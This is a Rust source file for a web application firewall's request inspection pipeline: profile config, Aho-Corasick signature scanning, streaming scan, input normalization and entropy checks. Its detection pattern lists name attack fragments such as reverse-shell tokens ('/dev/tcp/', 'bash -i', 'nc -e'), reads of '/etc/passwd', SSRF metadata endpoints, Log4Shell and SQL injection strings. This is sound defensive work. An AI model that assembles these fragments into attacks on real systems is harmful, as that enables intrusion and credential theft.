// SPDX-License-Identifier: Apache-2.0
//! Zion WAF — 5-gate request inspection pipeline (Aho-Corasick, entropy, simd-json).
//!
//! Architecture: 5-gate pipeline, fail-fast, zero-regex.
//!
//! Gate 1: Body size enforcement (O(1), no inspection)
//! Gate 2: Content-Type strict validation (zero-alloc case-insensitive)
//! Gate 3: Aho-Corasick injection scanner (SQLi/XSS/CMDi, single O(N) pass).
//!         Pattern set is selected per-profile: `Balanced` (default,
//!         high precision) or `Aggressive` (broader recall, higher FP).
//! Gate 4: Payload entropy analysis (detect obfuscated/encoded payloads).
//!         For JSON content-types the calculation is restricted to bytes
//!         inside string literals so structural punctuation does not
//!         dilute the signal. Threshold and kill-switch are per-profile.
//! Gate 5: JSON structural validation (simd-json, depth + string limits).
//!
//! Properties:
//! - Zero regex (DFA-immune to ReDoS by construction)
//! - Zero heap allocation on the fast path (GET/HEAD/DELETE/OPTIONS)
//! - Single-pass body scan via Aho-Corasick automaton
//! - All gates are O(N) or O(1) — no backtracking, no exponential blowup
//!
//! NOTE: prior versions of this header also described a sixth
//! "fixed-length profiling" gate; it was never implemented and the
//! advertisement has been removed to keep docs and code in lock-step.

use aho_corasick::AhoCorasick;
use serde::Deserialize;
use std::sync::OnceLock;

// ─────────────────────────────────────────────────────────────────────────────
// WAF Profile schema. Lives here (not in `config.rs`) so the bench surface
// in `benches/waf_streaming.rs` can construct a profile via the lib without
// pulling the whole config-loader dependency graph (auth/security/audit/etc).
// `config.rs` re-exports these via `pub use crate::waf::{WafMode, WafProfile};`
// to preserve every existing import site.
// ─────────────────────────────────────────────────────────────────────────────

/// WAF detection mode — selects which Aho-Corasick pattern set is scanned.
///
/// `Balanced` (default): high-precision patterns. SQLi/XSS tags/path traversal/
/// SSRF/XXE/Log4Shell/CRLF/SSTI/most LDAP and PHP patterns. Tuned to keep the
/// false-positive rate low for content-bearing APIs (comments, code paste,
/// docs, payloads with base64).
///
/// `Aggressive`: balanced PLUS broad-substring patterns that catch more
/// attacks but also flag legitimate developer/tooling content. Use this on
/// strict admin paths, never on user-content APIs unless you've measured the
/// FP rate. Examples added under aggressive: `alert(`, `eval(`,
/// `document.cookie`, `innerhtml`, `os.system(`, `pickle.loads`,
/// `Runtime.getRuntime`, `$gt`/`$ne`/`$regex` (unanchored MongoDB ops), and
/// generic XSS event handlers like `onclick=`/`onmouseover=`.
#[derive(Deserialize, Clone, Copy, Debug, PartialEq, Eq, Default)]
#[serde(rename_all = "lowercase")]
pub enum WafMode {
    #[default]
    Balanced,
    Aggressive,
}

#[derive(Deserialize, Clone, Debug)]
#[serde(deny_unknown_fields)]
pub struct WafProfile {
    #[serde(default)]
    pub mode: WafMode,
    #[serde(default = "default_max_body_mb")]
    pub max_body_mb: u64,
    #[serde(default = "default_max_depth")]
    pub max_depth: usize,
    #[serde(default = "default_max_string_len")]
    pub max_string_len: usize,
    #[serde(default = "default_true")]
    pub deny_unknown_content_types: bool,
    #[serde(default = "default_allowed_content_types")]
    pub allowed_content_types: Vec<String>,
    /// Run Shannon-entropy gate on bodies ≥256 bytes. When true, denies
    /// requests whose entropy exceeds `entropy_threshold`. Default: true.
    /// Disable on routes that legitimately accept high-entropy payloads
    /// (binary uploads as JSON-base64, encrypted blobs, signed envelopes).
    #[serde(default = "default_true")]
    pub entropy_check: bool,
    /// Entropy threshold in bits/byte. Default: 6.5 — leaves headroom above
    /// pure base64 (6.0 theoretical max) so JWTs, signed URLs and base64
    /// payloads are not flagged. Random/encrypted content sits at ~7.5–8.0.
    #[serde(default = "default_entropy_threshold")]
    pub entropy_threshold: f64,
    /// Opt-in streaming WAF body inspection (issue #49). When `true`, the
    /// dispatcher feeds each request-body frame to a [`StreamingScanner`] as
    /// it arrives off the wire — an injection pattern in the first chunk
    /// returns 400 before the rest of the upload is read. On allow, the
    /// frames are reassembled and the regular [`validate_request`]
    /// pipeline runs on the buffered body for the encoded-payload pass +
    /// entropy + JSON gates that the streamer does not cover.
    ///
    /// Default: `false` (existing buffered behaviour). Promote to default
    /// once the bench numbers (`waf/streaming/*` in
    /// `benchmarks/results/criterion/baseline.json`) hold steady.
    #[serde(default)]
    pub streaming: bool,
    /// Request headers whose values go through the injection scanner, like the URI: names,
    /// case-insensitive, with an optional trailing `*` (`"x-*"`; `"*"` is every header).
    /// Empty (the default) scans none: header-borne payloads such as Log4Shell in a
    /// `User-Agent` then reach the upstream unscanned.
    ///
    /// Off by default because a signature that is right for a query string can be wrong for
    /// a header: in `aggressive` mode `Origin: http://localhost:3000` and a `Referer` that
    /// contains `eval(` are blocked. In `balanced` mode the benign header corpus
    /// (`benchmarks/waf-corpus/headers-benign.json`) has no false positive. Turn it on with
    /// `waf_shadow = true` first and read `zion_waf_shadow_would_block`.
    #[serde(default)]
    pub scan_headers: Vec<String>,
    /// Strict `multipart/form-data` structure limits (#694). A body labelled
    /// multipart is parsed by RFC 2046 and held to these bounds; a body that
    /// does not parse cleanly, or that PHP, Werkzeug or Django would split
    /// into other parts, is denied, never forwarded. Max number of parts.
    /// Default 1000: a real form has a handful, a part flood (PHP2Shell and a
    /// series of parser CVEs) has thousands.
    #[serde(default = "default_max_parts")]
    pub max_parts: usize,
    /// Max number of file parts (a part whose Content-Disposition carries a
    /// `filename` or a `filename*`, an empty `filename=""` included). Default 256.
    #[serde(default = "default_max_file_parts")]
    pub max_file_parts: usize,
    /// Max header lines in one part. Default 16: a real part has two or three
    /// (Content-Disposition, maybe Content-Type).
    #[serde(default = "default_max_part_headers")]
    pub max_part_headers: usize,
    /// Max total bytes of one part's header block. Default 8192.
    #[serde(default = "default_max_part_header_bytes")]
    pub max_part_header_bytes: usize,
    /// Form field names refused outright: a part whose Content-Disposition
    /// `name` matches (case-insensitive) is denied. Empty by default; set e.g.
    /// `PHP_SESSION_UPLOAD_PROGRESS`.
    #[serde(default)]
    pub deny_field_names: Vec<String>,
    /// Part header names refused outright (case-insensitive). Default
    /// `__proto__`, `constructor`, which are never legitimate part header names.
    #[serde(default = "default_deny_part_header_names")]
    pub deny_part_header_names: Vec<String>,
    /// Refuse a form field whose Content-Disposition `name` encodes an array with a numeric
    /// index above this (e.g. `items[4294967295]`), which makes some frameworks allocate a huge
    /// sparse array (multer CVE-2026-77078). Default 100000; `0` disables the check. Real array
    /// forms (`items[0]`, `user[addresses][3]`) stay far below it.
    #[serde(default = "default_max_field_name_index")]
    pub max_field_name_index: u64,
}

fn default_max_body_mb() -> u64 {
    10
}
fn default_max_depth() -> usize {
    10
}
fn default_max_string_len() -> usize {
    1_048_576
}
fn default_allowed_content_types() -> Vec<String> {
    vec![
        "application/json".to_string(),
        "multipart/form-data".to_string(),
    ]
}
fn default_entropy_threshold() -> f64 {
    6.5
}
fn default_true() -> bool {
    true
}
fn default_max_parts() -> usize {
    1000
}
fn default_max_file_parts() -> usize {
    256
}
fn default_max_part_headers() -> usize {
    16
}
fn default_max_part_header_bytes() -> usize {
    8192
}
fn default_deny_part_header_names() -> Vec<String> {
    vec!["__proto__".to_string(), "constructor".to_string()]
}
fn default_max_field_name_index() -> u64 {
    100_000
}

impl Default for WafProfile {
    fn default() -> Self {
        Self {
            mode: WafMode::default(),
            max_body_mb: default_max_body_mb(),
            max_depth: default_max_depth(),
            max_string_len: default_max_string_len(),
            deny_unknown_content_types: true,
            allowed_content_types: default_allowed_content_types(),
            entropy_check: true,
            entropy_threshold: default_entropy_threshold(),
            streaming: false,
            scan_headers: Vec::new(),
            max_parts: default_max_parts(),
            max_file_parts: default_max_file_parts(),
            max_part_headers: default_max_part_headers(),
            max_part_header_bytes: default_max_part_header_bytes(),
            deny_field_names: Vec::new(),
            deny_part_header_names: default_deny_part_header_names(),
            max_field_name_index: default_max_field_name_index(),
        }
    }
}

impl WafProfile {
    /// Is `name` (lower-case, as hyper stores header names) one of `scan_headers`?
    fn scans_header(&self, name: &str) -> bool {
        self.scan_headers
            .iter()
            .any(|entry| match entry.strip_suffix('*') {
                Some(prefix) => name
                    .get(..prefix.len())
                    .is_some_and(|head| head.eq_ignore_ascii_case(prefix)),
                None => entry.eq_ignore_ascii_case(name),
            })
    }

    /// Problems in `scan_headers`, for config validation.
    pub fn scan_headers_errors(&self) -> Vec<String> {
        self.scan_headers
            .iter()
            .filter(|entry| {
                let name = entry.strip_suffix('*').unwrap_or(entry);
                // `*` alone (every header) is allowed; otherwise a header name, maybe a prefix.
                (name.is_empty() && entry.as_str() != "*")
                    || !name
                        .bytes()
                        .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
            })
            .map(|entry| {
                format!(
                    "scan_headers entry {entry:?} is not a header name (letters, digits, `-`, \
                     `_`, with an optional trailing `*`)"
                )
            })
            .collect()
    }

    /// Problems in the multipart structure limits, for config validation. A zero
    /// where at least one is required would deny every multipart body; `max_file_parts`
    /// is allowed to be zero, which refuses every file part.
    pub fn multipart_limits_errors(&self) -> Vec<String> {
        let mut errs = Vec::new();
        if self.max_parts == 0 {
            errs.push("max_parts must be >= 1".to_string());
        }
        if self.max_part_headers == 0 {
            errs.push("max_part_headers must be >= 1".to_string());
        }
        if self.max_part_header_bytes == 0 {
            errs.push("max_part_header_bytes must be >= 1".to_string());
        }
        errs
    }
}

/// Scan the header values `profile.scan_headers` selects. The first one that matches is
/// returned with its header name (never its value: a header can hold a credential).
pub fn validate_headers<'h>(
    headers: &'h hyper::HeaderMap,
    profile: &WafProfile,
) -> Option<(&'h str, &'static str)> {
    if profile.scan_headers.is_empty() {
        return None;
    }
    headers.iter().find_map(|(name, value)| {
        if !profile.scans_header(name.as_str()) {
            return None;
        }
        match validate_header_value(value.as_bytes(), profile.mode) {
            WafVerdict::Deny(reason) => Some((name.as_str(), reason)),
            WafVerdict::Allow => None,
        }
    })
}

/// WAF verdict — returned from the pipeline.
#[derive(Debug, PartialEq)]
pub enum WafVerdict {
    Allow,
    Deny(&'static str),
}

// ═══════════════════════════════════════════════════════════════════
// GATE 3: Aho-Corasick Injection Scanner
// Built once at first use. Searches dozens-to-hundreds of patterns in
// O(N) over the body in a single pass.
//
// Two pattern sets:
//   * BALANCED — high-precision: tag-anchored XSS, anchored SQLi/CMDi,
//     specific SSRF endpoints, exact CVE strings (Log4Shell, XXE).
//     Default profile. Tuned to keep FP rate low for content-bearing
//     APIs (comments, code paste, docs, base64-in-JSON).
//   * AGGRESSIVE_EXTRA — adds broad, unanchored substrings
//     (`alert(`, `eval(`, `$gt`, `os.system(`, …) that catch more
//     attacks but flag legitimate developer/tooling content. Opt-in
//     via `mode = "aggressive"` on the WAF profile.
//
// Each profile gets its own automaton (built lazily, cached for the
// process lifetime). Switching costs are zero at request time — we
// just dispatch to the right `&'static AhoCorasick`.
// ═══════════════════════════════════════════════════════════════════

/// Patterns active under both `balanced` and `aggressive` modes. Anchored
/// or rare enough that false positives in real-world request bodies are
/// uncommon.
const BALANCED_PATTERNS: &[&str] = &[
    // ── SQL Injection (anchored quote/keyword combos, low FP) ──
    "' or '1'='1",
    "' or 1=1",
    "'; drop table",
    "'; delete from",
    "1; exec ",
    "1; execute ",
    "' and '1'='1",
    "waitfor delay",
    "pg_sleep(",
    // Error-based + stacked SQLi: specific function/proc names, ~0 FP.
    "extractvalue(",
    "updatexml(",
    "xp_cmdshell",
    "||(select",
    "'; shutdown",
    // ── XSS: Tags (anchored on `<`) ──
    "<script",
    "</script",
    "<svg onload",
    "<body onload",
    "<input onfocus",
    "<details ontoggle",
    "<video onerror",
    "<audio onerror",
    "<marquee onstart",
    "<math xlink",
    // ── XSS: high-signal event handlers (others moved to aggressive) ──
    "onerror=",
    "onload=",
    "srcdoc=",
    "javascript:",
    // ── Command Injection (anchored: `;`, `|`, `$(`, backtick, newline) ──
    "; cat ",
    "; ls ",
    "; rm ",
    "; wget ",
    "; curl ",
    ";cat ",
    ";ls ",
    ";rm ",
    ";wget ",
    ";curl ",
    "| cat ",
    "| ls ",
    "| rm ",
    "|cat ",
    "|ls ",
    "|rm ",
    "$(cat ",
    "$(ls ",
    "`cat ",
    "`ls ",
    "\ncat ",
    "\nls ",
    "\nwget ",
    "\ncurl ",
    // ── Command injection: unambiguous Unix forms (reverse shells, IFS bypass,
    //    brace expansion, `nc`/`bash -i`). High signal, ~0 FP on real traffic. ──
    "/dev/tcp/",
    "bash -i",
    "nc -e",
    "ncat -e",
    " -e /bin/",
    "${ifs",
    "$ifs",
    "{cat,",
    "{ls,",
    "; nc ",
    ";nc ",
    "| nc ",
    "|nc ",
    "/etc/passwd",
    "/etc/shadow",
    // ── Path Traversal ──
    "../../",
    "..\\..\\",
    "%2e%2e%2f",
    "%2e%2e/",
    "....//",
    // ── SSRF: cloud metadata endpoints (specific) ──
    "http://169.254.169.254",
    "https://169.254.169.254",
    "http://[::ffff:169.254",
    "http://metadata.google",
    "https://metadata.google",
    "http://100.100.100.200",
    "http://0xA9FEA9FE",
    "http://2852039166",
    "http://169.254.169.254.nip.io",
    "169.254.169.254/metadata",
    "http://192.0.0.192",
    "kubernetes.default.svc",
    // SSRF: internal-only URI schemes — never legitimate in user input.
    "gopher://",
    "dict://",
    // ── Windows Path Traversal ──
    "c:\\windows\\",
    "c:\\inetpub\\",
    "..\\..\\..\\windows",
    // ── Open Redirect ──
    "/\\evil",
    "/%09/",
    // ── LDAP Injection (parens-anchored) ──
    ")(cn=*",
    ")(uid=*",
    ")(mail=*",
    ")(objectclass=*",
    // ── XML/XXE ──
    "<!entity",
    "system \"file://",
    "system \"http://",
    "<xsl:",
    "xmlns:xlink",
    "<!attlist",
    // ── SSTI ──
    "#{7*7}",
    "${7*7}",
    "{{7*7}}",
    "<%=",
    "{%import",
    "#{t(java",
    // ── CRLF / Header Injection ──
    "%0d%0a",
    "%0aset-cookie:",
    "%0alocation:",
    "\r\nset-cookie:",
    // ── Log4Shell / JNDI (specific CVE patterns) ──
    "${jndi:",
    "${env:",
    "${sys:",
    // ── PHP-specific (specific URI schemes) ──
    "unserialize(",
    "php://input",
    "php://filter",
    "phar://",
    // ── GraphQL introspection (specific tokens) ──
    "{__schema",
    "{__type",
    "query{__",
];

/// Patterns added on top of BALANCED when `mode = "aggressive"`. These
/// catch more attacks but DO flag legitimate developer/code/educational
/// content. Use only on routes where the FP rate is tolerable (admin
/// panels, internal tooling), never on user-content APIs without measuring.
const AGGRESSIVE_EXTRA_PATTERNS: &[&str] = &[
    // ── Demoted from BALANCED: high false-positive rate on real traffic
    //    (prose, CMS/HTML content, config values, JS docs), so they only
    //    fire on strict/admin routes. Active XSS is still caught in balanced
    //    via the dangerous *attributes* (onerror=/onload=/javascript:/srcdoc=);
    //    XXE via "<!entity"; Log4Shell via "${jndi:". See the e2e WAF
    //    false-positive findings. ──
    "union select",
    "union all select",
    "information_schema",
    "<iframe",
    "<object",
    "<embed",
    "<img src",
    "<!doctype",
    "data:text/html",
    "ldap://",
    "ldaps://",
    "/metadata/v1",
    "/openstack/latest",
    "__proto__",
    "constructor.prototype",
    // ── SQLi: function calls / token reads (FP in BI tools, dump status) ──
    "sleep(",
    "benchmark(",
    "into outfile",
    "into dumpfile",
    "load_file(",
    "@@version",
    "char(0x",
    // ── XSS: low-anchor event handlers (FP on any code-bearing payload) ──
    "onfocus=",
    "onmouseover=",
    "onclick=",
    "oninput=",
    "onchange=",
    "onsubmit=",
    "onkeydown=",
    "onkeyup=",
    "onkeypress=",
    "ondblclick=",
    "oncontextmenu=",
    "ondragstart=",
    "ondrop=",
    "onpaste=",
    "ontouchstart=",
    "onpointerover=",
    "onanimationend=",
    "ontransitionend=",
    "onresize=",
    "onscroll=",
    "onwheel=",
    "onmouseenter=",
    "ontoggle=",
    "onpageshow=",
    // ── XSS: JS API sinks (heavy FP in MDN-style docs / code paste) ──
    "expression(",
    "alert(",
    "confirm(",
    "prompt(",
    "document.cookie",
    "document.write",
    "document.domain",
    "window.location",
    "eval(",
    "fromcharcode",
    "innerhtml",
    "outerhtml",
    "insertadjacenthtml",
    // ── Command injection: Windows tokens (FP in event-log shipping) ──
    "cmd.exe",
    "powershell",
    "& type ",
    // ── Command injection: Unix substitution + bare metachar+command. Broader
    //    (`$(` also flags jQuery/shell snippets) → aggressive routes only. ──
    "$(",
    "`id`",
    "`whoami",
    "$(id",
    "$(whoami",
    "whoami",
    "ping -c",
    "; sleep ",
    "&&sleep",
    "&& ls",
    "| sh",
    "|sh ",
    "| bash",
    "|bash",
    ">& /dev",
    " -o- | ",
    // ── NoSQL ops (no delimiter — `{"id":"$gt-23"}` falsely matches) ──
    "$gt",
    "$ne",
    "$regex",
    "$where",
    "$lookup",
    "$unionwith",
    "db.collection",
    ".find({",
    ".findone({",
    ".aggregate([",
    ".mapreduce(",
    "this.constructor",
    "{{constructor",
    "{{.constructor",
    // ── Deserialization / RCE: language-class-name patterns ──
    // (FP whenever an APM/error reporter forwards a stack trace)
    "runtime.getruntime",
    "processbuilder",
    "objectinputstream",
    "java.lang.runtime",
    "javax.script.scriptengine",
    "pickle.loads",
    "__reduce__",
    "__import__(",
    "subprocess.call",
    "subprocess.popen",
    "os.system(",
    "os.popen(",
    // ── GraphQL: lone introspection tokens (also appear in legit schemas) ──
    "__schema",
    "__type",
    "mutation{",
    // ── SSRF: loopback / internal targets (FP on legit localhost dev URLs) ──
    "http://localhost:",
    "https://localhost:",
    "://127.0.0.1",
    "http://0.0.0.0",
    "http://2130706433",
    "file:///proc",
    "ftp://127.0.0.1",
    // ── Deserialization / prototype pollution / YAML (FP on code/serialized) ──
    "o:8:\"",
    "ro0ab",
    "__proto__",
    "constructor[prototype",
    "[prototype][",
    "!!python/",
    // ── Shellshock (`() { :` — not bare `() {`, which is a legit empty fn) ──
    "() { :",
    // ── SQLi: quote-paren OR variants + comment-terminated injection ──
    "\") or (\"",
    "') or ('",
    "'--",
    // ── corpus-v2 round: high-frequency real-world misses (FP-checked vs the
    //    136-payload benign set; all aggressive-tier). ──
    // PHP stream wrappers (RCE/LFI vectors)
    "expect://",
    "data://",
    "zip://",
    "compress.",
    "ssh2.",
    // Java gadget / reflection class refs (FP on stack traces → aggressive)
    "java.io.",
    "java.net.url",
    "java.lang.process",
    "java.lang.reflect",
    "java.lang.class",
    // Command injection: Windows + bare-metachar sleep
    "| sleep",
    "& sleep",
    "net view",
    "net user",
    "dir c:",
    // Django/ORM + NoSQL lookup injection
    "__startswith",
    "__endswith",
    "__contains\"",
    "__regex",
    // SSRF: container/loopback hostnames
    "host.docker.internal",
    // PHP open tags + dangerous funcs (decoded form — high-frequency in corpus)
    "<?php",
    "<?=",
    "system(",
    "shell_exec(",
    "passthru(",
    "base64_decode(",
    "phpinfo(",
    // Perl/Ruby SSTI interpolation seen across generic
    "@{[",
    // SSRF: more internal/abusable URI schemes
    "file://",
    "jar:",
    "ftp://",
];

static BALANCED_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();
static AGGRESSIVE_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();

#[inline]
fn build_scanner(patterns: &[&str]) -> AhoCorasick {
    AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .build(patterns)
        .expect("Failed to build Aho-Corasick automaton")
}

fn balanced_scanner() -> &'static AhoCorasick {
    BALANCED_SCANNER.get_or_init(|| build_scanner(BALANCED_PATTERNS))
}

fn aggressive_scanner() -> &'static AhoCorasick {
    AGGRESSIVE_SCANNER.get_or_init(|| {
        let mut all: Vec<&str> =
            Vec::with_capacity(BALANCED_PATTERNS.len() + AGGRESSIVE_EXTRA_PATTERNS.len());
        all.extend_from_slice(BALANCED_PATTERNS);
        all.extend_from_slice(AGGRESSIVE_EXTRA_PATTERNS);
        build_scanner(&all)
    })
}

#[inline]
fn scanner_for(mode: WafMode) -> &'static AhoCorasick {
    match mode {
        WafMode::Balanced => balanced_scanner(),
        WafMode::Aggressive => aggressive_scanner(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Streaming scan (Track D — opt-in path).
//
// `validate_request` buffers the entire body before scanning. That's optimal
// for small JSON / form payloads but pays peak-memory cost equal to the body
// size, and pays the full scan cost even when the offending pattern is in
// the first 64 bytes. The streaming variant solves both:
//
//   * early-exit ⇒ a payload whose first chunk contains `union select`
//     denies as soon as the first chunk is scanned, regardless of total
//     body size;
//   * peak memory ⇒ at most one chunk plus an overlap buffer of
//     `MAX_PATTERN_LEN - 1` bytes is held at a time, vs the whole body.
//
// The catch is that a pattern can straddle two chunks. We solve that by
// keeping the last `MAX_PATTERN_LEN - 1` bytes of each chunk and prepending
// them to the next. As long as no pattern is longer than `MAX_PATTERN_LEN`,
// nothing is missed.
// ─────────────────────────────────────────────────────────────────────────────

/// Upper bound on the length of any pattern shipped in BALANCED or
/// AGGRESSIVE. Verified by the `pattern_lengths_fit_max` test.
/// Bumping this is cheap (a few bytes of overlap per chunk); shrinking it
/// requires re-checking every pattern.
pub const MAX_PATTERN_LEN: usize = 64;

/// Verdict from a streaming scan. `Allow` means *every chunk consumed so
/// far* was clean — the caller is expected to keep feeding chunks until
/// the body is exhausted. `Deny` is terminal: drop the connection / 400.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StreamVerdict {
    Allow,
    Deny(&'static str),
}

/// Stateful streaming scanner. One per request — created cheaply at the
/// start of the body validation path. Holds:
///   * a reference to the shared `AhoCorasick` automaton (no copy);
///   * a small overlap buffer carrying the last (MAX_PATTERN_LEN - 1)
///     bytes from the previous chunk, so a pattern straddling a chunk
///     boundary is still matched on the next call;
///   * a hard cap on total bytes consumed (mirrors `max_body_mb`),
///     enforced incrementally so an oversized body is rejected early.
pub struct StreamingScanner {
    scanner: &'static AhoCorasick,
    overlap: Vec<u8>,
    bytes_seen: u64,
    max_bytes: u64,
}

impl StreamingScanner {
    /// New scanner targeting the given profile. `max_body_bytes` mirrors
    /// `WafProfile::max_body_mb * 1_048_576`.
    pub fn new(mode: WafMode, max_body_bytes: u64) -> Self {
        Self {
            scanner: scanner_for(mode),
            overlap: Vec::with_capacity(MAX_PATTERN_LEN),
            bytes_seen: 0,
            max_bytes: max_body_bytes,
        }
    }

    /// Feed the next body chunk. Returns immediately on first match.
    /// Calling `feed` after a previous `Deny` result is allowed but
    /// useless — the verdict cannot un-deny.
    pub fn feed(&mut self, chunk: &[u8]) -> StreamVerdict {
        // Body-size gate, incremental.
        self.bytes_seen = self.bytes_seen.saturating_add(chunk.len() as u64);
        if self.bytes_seen > self.max_bytes {
            return StreamVerdict::Deny("body exceeds max size");
        }

        // Build the search window: the previous overlap + this chunk.
        // For typical chunk sizes (8K-64K) this is one short copy; we
        // could avoid the copy by using `aho-corasick::AhoCorasick::stream_find_iter`
        // on a `Read` adapter, but that requires an io::Read trait object
        // with extra plumbing — measurable wins should come first.
        let mut window = Vec::with_capacity(self.overlap.len() + chunk.len());
        window.extend_from_slice(&self.overlap);
        window.extend_from_slice(chunk);

        if self.scanner.is_match(&window) {
            return StreamVerdict::Deny("injection pattern detected");
        }

        // Save the trailing (MAX_PATTERN_LEN - 1) bytes for the next call.
        let keep = (MAX_PATTERN_LEN - 1).min(window.len());
        self.overlap.clear();
        self.overlap
            .extend_from_slice(&window[window.len() - keep..]);

        StreamVerdict::Allow
    }

    /// Total bytes consumed so far. Useful for emitting metrics from the
    /// caller without exposing internal state.
    ///
    /// `#[allow(dead_code)]`: dispatch tracks the size cap via the
    /// scanner's internal counter (returned as `Deny("body exceeds max
    /// size")`); this getter is exposed for benches and external
    /// consumers that want a non-deny readout.
    #[allow(dead_code)]
    pub fn bytes_seen(&self) -> u64 {
        self.bytes_seen
    }
}

// ═══════════════════════════════════════════════════════════════════
// GATE 4: Entropy Analysis
// Shannon entropy is a heuristic for "this body looks like obfuscated /
// encrypted / packed content rather than human text or normal JSON."
//
// Reference points (bits/byte):
//   * English / source code:       ~3.5–4.7
//   * JSON struct (with keys):     ~3.5–5.5
//   * Pure base64 (max theoretic): 6.0
//   * JWT / signed URL:            5.5–6.0
//   * Random / encrypted blob:     7.5–8.0
//
// The previous default (5.5) flagged any base64 / JWT in a request body —
// a foot-gun for APIs that legitimately accept signed payloads. The new
// default is 6.5, with a per-profile override (`entropy_threshold`) and
// a kill-switch (`entropy_check`).
//
// For JSON bodies we additionally restrict the calculation to the bytes
// inside string literals (keys + values, excluding structural punctuation
// and numeric literals), so low-entropy structural bytes don't dilute the
// signal.
// ═══════════════════════════════════════════════════════════════════

/// Unified WAF Normalizer (Single-Pass, Zero-Alloc)
/// Replaces recursive Cow allocations with a fast byte-by-byte state machine.
/// Normalizes:
/// - URL encoding (%XX and +)
/// - JSON unicode escapes (\uXXXX)
/// - SQL inline comments (/* ... */) -> space
fn normalize_unified(input: &[u8], out: &mut Vec<u8>) {
    out.clear();
    let len = input.len();
    let mut i = 0;
    let mut in_sql_comment = false;

    while i < len {
        // 1. SQL Comment Stripping State
        if in_sql_comment {
            if i + 1 < len && input[i] == b'*' && input[i + 1] == b'/' {
                in_sql_comment = false;
                i += 2;
                if out.last() != Some(&b' ') {
                    out.push(b' '); // Pad with space to block `1/*comment*/OR` concat
                }
            } else {
                i += 1;
            }
            continue;
        }

        if i + 1 < len && input[i] == b'/' && input[i + 1] == b'*' {
            in_sql_comment = true;
            i += 2;
            continue;
        }

        let b = input[i];

        // 2. URL Decode State
        if b == b'+' {
            push_norm(out, b' ');
            i += 1;
            continue;
        } else if b == b'%' {
            // 6-char forms first — both evade a plain %XX decoder:
            if i + 5 < len {
                let win = &input[i..i + 6];
                // Overlong-UTF-8 encodings of '/' and '\' used to slip "../"
                // past path filters (e.g. ..%c0%af..%c0%af -> ../../).
                if win.eq_ignore_ascii_case(b"%c0%af") {
                    push_norm(out, b'/');
                    i += 6;
                    continue;
                }
                if win.eq_ignore_ascii_case(b"%c1%9c") {
                    push_norm(out, b'\\');
                    i += 6;
                    continue;
                }
                // IIS-style %uXXXX -> codepoint (mirrors JSON \uXXXX). Nested
                // if-let (not an `&& let` chain) to stay within MSRV 1.82.
                if input[i + 1] == b'u' || input[i + 1] == b'U' {
                    if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                        hex_val(input[i + 2]),
                        hex_val(input[i + 3]),
                        hex_val(input[i + 4]),
                        hex_val(input[i + 5]),
                    ) {
                        push_codepoint(
                            out,
                            ((h1 as u16) << 12)
                                | ((h2 as u16) << 8)
                                | ((h3 as u16) << 4)
                                | (h4 as u16),
                        );
                        i += 6;
                        continue;
                    }
                }
            }
            // Standard %XX.
            if i + 2 < len {
                if let (Some(hi), Some(lo)) = (hex_val(input[i + 1]), hex_val(input[i + 2])) {
                    push_norm(out, (hi << 4) | lo);
                    i += 3;
                    continue;
                }
            }
        }

        // 3. JSON Unicode State
        if b == b'\\' && i + 5 < len && input[i + 1] == b'u' {
            if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                hex_val(input[i + 2]),
                hex_val(input[i + 3]),
                hex_val(input[i + 4]),
                hex_val(input[i + 5]),
            ) {
                push_codepoint(
                    out,
                    ((h1 as u16) << 12) | ((h2 as u16) << 8) | ((h3 as u16) << 4) | (h4 as u16),
                );
                i += 6;
                continue;
            }
        }

        // 4. Default: fold whitespace runs + lowercase for normalization
        push_norm(out, b);
        i += 1;
    }
}

/// Push one byte into the normalized buffer, folding inline-whitespace runs
/// (space, tab, vertical-tab, form-feed) to a single space and ASCII-
/// lowercasing everything else — this is what stops `union  select`,
/// `union\tselect` and `1;  cat` from slipping past the single-space patterns.
/// `\n` / `\r` are deliberately NOT folded: several command-injection patterns
/// ("\ncat ", ...) treat the newline as a separator, and collapsing it to a
/// space would make them unreachable.
#[inline]
fn push_norm(out: &mut Vec<u8>, b: u8) {
    if matches!(b, b' ' | b'\t' | 0x0b | 0x0c) {
        if out.last() != Some(&b' ') {
            out.push(b' ');
        }
    } else {
        out.push(b.to_ascii_lowercase());
    }
}

/// Push a decoded 16-bit codepoint (from `\uXXXX` or `%uXXXX`): the BMP-low
/// bytes go through `push_norm` (so a decoded space/tab still collapses and
/// letters lowercase); higher codepoints are emitted as raw UTF-8.
#[inline]
fn push_codepoint(out: &mut Vec<u8>, cp: u16) {
    if cp <= 0xFF {
        push_norm(out, cp as u8);
    } else {
        let mut utf8_buf = [0u8; 3];
        let ch = char::from_u32(cp as u32).unwrap_or('?');
        out.extend_from_slice(ch.encode_utf8(&mut utf8_buf).as_bytes());
    }
}

#[inline]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Calculate Shannon entropy of a byte slice (bits per byte).
/// 0.0 = constant; 8.0 = perfectly random. Caller guarantees data.len() ≥ 1.
#[inline]
fn shannon_entropy(data: &[u8]) -> f64 {
    let mut freq = [0u32; 256];
    for &b in data {
        freq[b as usize] += 1;
    }

    let inv_len = 1.0 / data.len() as f64;
    let mut entropy = 0.0f64;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 * inv_len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Shannon entropy computed only over bytes inside JSON string literals.
///
/// Walks the JSON byte-by-byte (no allocation, no parse), accumulating
/// frequencies for every byte seen between matching `"` delimiters. Skips
/// structural bytes (`{`, `[`, `,`, `:`, whitespace) and numeric/literal
/// tokens, all of which are low-entropy and would otherwise dilute the
/// signal of an obfuscated payload hidden inside a single string value.
///
/// `\` escape sequences are honoured (the next byte is treated as inside
/// the string and not as a closing `"`). `\uXXXX` is consumed as 5 escape
/// bytes after the `\` — we don't decode it; this is a heuristic, not a
/// validator.
///
/// Returns `None` when fewer than `min_sample` total string bytes were
/// observed — too small a sample to draw a meaningful conclusion (and the
/// caller already enforces a 256-byte body floor before invoking the
/// entropy gate, so this only triggers on JSON that is mostly structure).
